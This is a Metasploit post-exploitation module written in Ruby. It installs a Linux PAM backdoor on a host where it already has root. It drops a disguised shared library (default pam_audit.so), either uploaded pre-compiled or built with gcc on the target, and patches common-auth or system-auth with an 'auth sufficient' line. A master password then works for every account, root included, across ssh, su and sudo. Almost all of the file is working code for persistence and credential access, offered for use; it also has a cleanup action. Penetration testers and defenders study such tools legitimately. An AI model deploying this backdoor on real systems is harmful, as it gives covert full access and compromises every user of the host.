# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Linux::Priv

  # 63-char placeholder embedded in the pre-compiled binary; must match pam_backdoor.c
  PLACEHOLDER = 'MSF_PAM_BACKDOOR_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
  MAX_PASS_LEN = PLACEHOLDER.bytesize # 63

  C_SRC_PATH = File.join(Msf::Config.data_directory, 'exploits', 'pam_backdoor', 'pam_backdoor.c')
  X64_SO_PATH = File.join(Msf::Config.data_directory, 'exploits', 'pam_backdoor', 'pam_backdoor_x86_64.so')

  # Known PAM module directories in preference order (most-specific first)
  PAM_MODULE_DIRS = %w[
    /lib/x86_64-linux-gnu/security
    /lib/aarch64-linux-gnu/security
    /lib/arm-linux-gnueabihf/security
    /lib/i386-linux-gnu/security
    /lib64/security
    /usr/lib64/security
    /lib/security
    /usr/lib/security
  ].freeze

  # PAM config files in preference order (Debian common-auth checked first)
  PAM_CONFIGS = %w[
    /etc/pam.d/common-auth
    /etc/pam.d/system-auth
    /etc/pam.d/system-auth-ac
    /etc/pam.d/sshd
    /etc/pam.d/login
  ].freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux PAM Backdoor',
        'Description' => %q{
          Installs a malicious PAM shared library (.so) on the target that
          silently accepts a configured master password for ANY local account,
          including root. Normal passwords continue to work, so the backdoor
          is transparent. Works with ssh, su, sudo, login, and any other
          service that routes through PAM.

          On x86_64 targets the pre-compiled binary is patched in-memory and
          uploaded directly - no compiler needed on the target. On other
          architectures the module falls back to compiling the .c source on
          the target (requires gcc).

          The module drops the .so into the system PAM module directory and
          inserts an "auth sufficient" line at the top of the selected PAM
          config so it is checked before the real authentication stack.
          Patching common-auth (Debian) or system-auth (RHEL) automatically
          covers sudo, because those configs are @include'd by /etc/pam.d/sudo.

          Run with ACTION=Cleanup (and identical options) to remove all
          artifacts.
        },
        'License' => MSF_LICENSE,
        'Author' => ['h00die'],
        'Platform' => ['linux'],
        'Privileged' => true,
        'References' => [
          ['URL', 'https://github.com/zephrax/linux-pam-backdoor'],
          ['URL', 'https://unit42.paloaltonetworks.com/analysis-of-a-pam-backdoor/'],
          ['URL', 'https://www.cyberark.com/resources/blog/plague-malware-exploits-pluggable-authentication-module-to-breach-linux-systems'],
          ['ATT&CK', Mitre::Attack::Technique::T1556_003_PLUGGABLE_AUTHENTICATION_MODULES]
        ],
        'SessionTypes' => %w[meterpreter shell],
        'Actions' => [
          ['Install', { 'Description' => 'Install PAM backdoor (default)' }],
          ['Cleanup', { 'Description' => 'Remove the backdoor .so and restore PAM config' }]
        ],
        'DefaultAction' => 'Install',
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES],
          'Reliability' => [],
          'AKA' => ['PamDOORa', 'Plague']
        }
      )
    )

    register_options(
      [
        OptString.new('BACKDOOR_PASS', [
          true,
          'Master password accepted for every account',
          Rex::Text.rand_text_alphanumeric(20)
        ]),
        OptString.new('SO_NAME', [
          true,
          'Filename for the installed PAM .so (something inconspicuous)',
          'pam_audit.so'
        ]),
        OptString.new('PAM_CONFIG', [false, 'Path to PAM config to patch (auto-detect when blank)', '']),
        OptBool.new('STORE_CREDS', [true, 'Enumerate users with valid shells and store PAM credentials in the database', true])
      ]
    )
  end

  def run
    unless is_root?
      fail_with(Failure::NoAccess, 'Root privileges are required')
    end

    pass = datastore['BACKDOOR_PASS']
    if pass.bytesize > MAX_PASS_LEN
      fail_with(Failure::BadConfig,
                "BACKDOOR_PASS is #{pass.bytesize} bytes; maximum is #{MAX_PASS_LEN}")
    end

    case action.name
    when 'Install' then do_install
    when 'Cleanup' then do_cleanup
    end
  end

  private

  # ── install ────────────────────────────────────────────────────────────────

  def do_install
    so_dir = find_pam_module_dir
    pam_cfg = resolve_pam_config

    fail_with(Failure::NotFound, 'Cannot locate a PAM module directory') unless so_dir
    fail_with(Failure::NotFound, 'Cannot locate a PAM config file') unless pam_cfg

    target_so = "#{so_dir}/#{datastore['SO_NAME']}"

    case choose_deploy_method
    when :precompiled
      print_status('Uploading pre-compiled x86_64 PAM module...')
      deploy_precompiled(target_so)
    when :gcc
      print_status('Compiling PAM module on target (gcc fallback)...')
      compile_on_target(target_so)
    end

    patch_pam_config(pam_cfg, target_so)

    print_good("Backdoor installed. Master password: #{datastore['BACKDOOR_PASS']}")
    print_status('Works with: ssh, su, sudo, login (any PAM-integrated service)')

    store_pam_creds if datastore['STORE_CREDS']

    report_note(
      host: session.target_host,
      type: 'linux.pam_backdoor',
      data: {
        so_path: target_so,
        pam_config: pam_cfg,
        password: datastore['BACKDOOR_PASS']
      }
    )
  end

  # Returns :precompiled if the target is x86_64 and the local binary exists,
  # :gcc if gcc is available on target, otherwise fails.
  def choose_deploy_method
    arch = create_process('uname', args: ['-m']).strip
    vprint_status("Target arch: #{arch}")

    return :precompiled if arch == 'x86_64' && File.exist?(X64_SO_PATH)

    unless command_exists?('gcc')
      fail_with(Failure::NotVulnerable,
                'No pre-compiled binary for this arch and gcc not found on target. ' \
                'Install gcc or cross-compile the .so manually.')
    end

    :gcc
  end

  def deploy_precompiled(target_so)
    binary = patch_placeholder(File.binread(X64_SO_PATH))
    upload_binary(target_so, binary)
    create_process('chown', args: ['root:root', target_so])
    chmod(target_so, 0o644)
    fail_with(Failure::Unknown, 'Could not upload pre-compiled .so') unless file_exist?(target_so)
    print_good("PAM module installed: #{target_so}")
  end

  def patch_placeholder(binary)
    idx = binary.b.index(PLACEHOLDER.b)
    fail_with(Failure::Unknown, 'Placeholder not found in pre-compiled binary') unless idx

    pass_bytes = datastore['BACKDOOR_PASS'].b
    # Overwrite placeholder bytes; null-pad to the same length (the original
    # null terminator at idx+63 is preserved, so strcmp terminates correctly)
    patched = binary.dup.b
    patched[idx, MAX_PASS_LEN] = pass_bytes + ("\x00" * (MAX_PASS_LEN - pass_bytes.bytesize))
    patched
  end

  def upload_binary(remote_path, data)
    if session.type == 'meterpreter'
      write_file(remote_path, data)
    else
      # Shell session: base64-encode in chunks, reassemble on target
      encoded = [data].pack('m0') # strict base64, no newlines
      tmpb64 = "/tmp/.#{Rex::Text.rand_text_hex(8)}.b64"
      rm_f(tmpb64)
      encoded.scan(/.{1,500}/).each do |chunk|
        create_process('/bin/sh', args: ['-c', "printf '%s' '#{chunk}' >> #{tmpb64}"])
      end
      create_process('/bin/sh', args: ['-c', "base64 -d #{tmpb64} > #{remote_path}; rm -f #{tmpb64}"])
    end
  end

  def compile_on_target(target_so)
    tmpbase = "/tmp/.#{Rex::Text.rand_text_hex(10)}"
    src = "#{tmpbase}.c"
    out = "#{tmpbase}.so"

    unless File.exist?(C_SRC_PATH)
      fail_with(Failure::BadConfig, "PAM C source not found: #{C_SRC_PATH}")
    end

    src_code = File.read(C_SRC_PATH).gsub(PLACEHOLDER, datastore['BACKDOOR_PASS'])
    write_file(src, src_code)

    libpam = find_libpam
    compile_cmd = if libpam
                    "gcc -shared -fPIC -nostartfiles -o #{out} #{src} #{libpam} 2>&1"
                  else
                    "gcc -shared -fPIC -nostartfiles -o #{out} #{src} -lpam 2>&1"
                  end
    result = create_process('/bin/sh', args: ['-c', compile_cmd])
    rm_f(src)

    unless file_exist?(out)
      fail_with(Failure::Unknown, "Compilation failed: #{result}")
    end

    rename_file(out, target_so)
    create_process('chown', args: ['root:root', target_so])
    chmod(target_so, 0o644)
    fail_with(Failure::Unknown, 'Could not move .so into place') unless file_exist?(target_so)
    print_good("PAM module compiled and installed: #{target_so}")
  end

  # Find the versioned libpam .so to link against without needing -dev headers
  def find_libpam
    candidates = %w[
      /lib/x86_64-linux-gnu/libpam.so.0
      /lib/aarch64-linux-gnu/libpam.so.0
      /lib/arm-linux-gnueabihf/libpam.so.0
      /lib/i386-linux-gnu/libpam.so.0
      /lib64/libpam.so.0
      /usr/lib64/libpam.so.0
      /lib/libpam.so.0
      /usr/lib/libpam.so.0
    ]
    candidates.find { |p| file_exist?(p) }
  end

  # Insert "auth sufficient <path>" as the FIRST auth line in the config.
  def patch_pam_config(config_path, so_path)
    current = read_file(config_path)

    if current.include?(so_path)
      print_status('PAM config already contains backdoor entry - skipping patch')
      return
    end

    backdoor_line = "auth\tsufficient\t#{so_path}\n"
    patched = if current =~ /^auth\s/
                current.sub(/^(auth\s)/m, "#{backdoor_line}\\1")
              else
                backdoor_line + current
              end

    write_file(config_path, patched)
    print_good("PAM config patched: #{config_path}")
    vprint_status("Inserted: #{backdoor_line.strip}")
  end

  # ── cleanup ────────────────────────────────────────────────────────────────

  def do_cleanup
    so_dir = find_pam_module_dir
    pam_cfg = resolve_pam_config
    so_name = datastore['SO_NAME']

    target_so = so_dir ? "#{so_dir}/#{so_name}" : nil

    if target_so && file_exist?(target_so)
      rm_f(target_so)
      print_good("Removed: #{target_so}")
    else
      print_warning("PAM module not found on target: #{target_so || so_name}")
    end

    strip_pam_config(pam_cfg, so_name) if pam_cfg && file_exist?(pam_cfg)

    print_good('Cleanup complete')
  end

  def strip_pam_config(config_path, so_name)
    current = read_file(config_path)
    cleaned = current.lines.reject { |l| l.include?(so_name) }.join
    if cleaned == current
      print_status("No backdoor line found in #{config_path}")
    else
      write_file(config_path, cleaned)
      print_good("PAM config restored: #{config_path}")
    end
  end

  # ── credential storage ─────────────────────────────────────────────────────

  def store_pam_creds
    valid_shells = read_valid_shells
    ssh_port = detect_ssh_port

    report_service(
      host: session.target_host,
      port: ssh_port,
      name: 'ssh',
      proto: 'tcp'
    )

    service_data = {
      address: session.target_host,
      port: ssh_port,
      service_name: 'ssh',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service
    }

    count = 0
    get_users.each do |u|
      shell = u[:shell].to_s.strip
      next unless valid_shells.include?(shell)

      store_valid_credential(
        user: u[:name],
        private: datastore['BACKDOOR_PASS'],
        private_type: :password,
        service_data: service_data
      )
      vprint_good("Stored credential for #{u[:name]} (shell: #{shell})")
      count += 1
    end

    print_good("Stored PAM backdoor credential for #{count} user(s) with valid shells")
  end

  COMMON_SHELLS = %w[
    /bin/sh
    /bin/bash
    /bin/zsh
    /bin/fish
    /bin/dash
    /bin/ksh
    /bin/tcsh
    /bin/csh
    /usr/bin/bash
    /usr/bin/zsh
    /usr/bin/fish
    /usr/bin/ksh
    /usr/bin/tcsh
    /usr/bin/sh
  ].freeze

  def read_valid_shells
    shells_file = read_file('/etc/shells')
    if shells_file && !shells_file.strip.empty?
      return shells_file.lines
                        .map(&:strip)
                        .reject { |l| l.start_with?('#') || l.empty? }
                        .to_set
    end

    vprint_status('/etc/shells not found, falling back to common shell list')
    COMMON_SHELLS.to_set
  end

  def detect_ssh_port
    raw = create_process('grep', args: ['-E', '^Port ', '/etc/ssh/sshd_config']).strip
    raw =~ /^Port\s+(\d+)/ ? ::Regexp.last_match(1).to_i : 22
  end

  # ── discovery helpers ──────────────────────────────────────────────────────

  def find_pam_module_dir
    PAM_MODULE_DIRS.each do |dir|
      return dir if file_exist?("#{dir}/pam_unix.so")
    end
    PAM_MODULE_DIRS.find { |dir| directory?(dir) }
  end

  def resolve_pam_config
    return datastore['PAM_CONFIG'] unless datastore['PAM_CONFIG'].to_s.strip.empty?

    PAM_CONFIGS.find { |path| file_exist?(path) }
  end

end
